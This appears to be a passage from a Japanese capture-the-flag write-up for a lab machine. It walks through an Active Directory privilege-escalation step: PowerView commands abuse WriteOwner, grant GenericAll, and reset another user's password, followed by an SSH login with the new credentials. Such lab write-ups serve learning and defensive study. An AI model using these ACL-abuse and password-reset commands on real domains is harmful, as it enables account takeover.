## tom -> claire

tomは**WriteOwner**の権限をclaireに対して持ってる。

![スクリーンショット 2022-01-15 11 50 15](https://user-images.githubusercontent.com/85237728/149606210-4c9591c9-8ec9-4e90-9984-95899be437ad.png)

claireのオーナーをtomに設定：

```
PS C:\Users\tom> Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
```

tomに、claireのことをGenericAllできるように権限を与える：

```
PS C:\Users\tom> Add-DomainObjectAcl -PrincipalIdentity tom -TargetIdentity claire -Rights All
```

これでtomはclaireのパスワードを再設定できる：

```
PS C:\Users\tom> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
PS C:\Users\tom> Set-DomainUserPassword -Identity claire -AccountPassword $UserPassword
```

このclaireのクリデンシャルでclaireにssh接続：

```
┌──(kali㉿kali)-[~]
└─$ sshpass -p 'Password123!' ssh cliare@10.10.10.77
```

（sshpassコマンドは`sudo apt install sshpass`でダウンロード可能）



ちなみにclaire->SYSTEMは...

root.txtに目が行きすぎて気づかなかったけど、C:\Uses\Administrator\Backup Scripts っていうディレクトリがあることに昼飯食ってから気づいた。（これ一種のミスディレクションだよ。root.txtの
真上にあったのにroot.txtに目が行きすぎて気づかなかった...。）
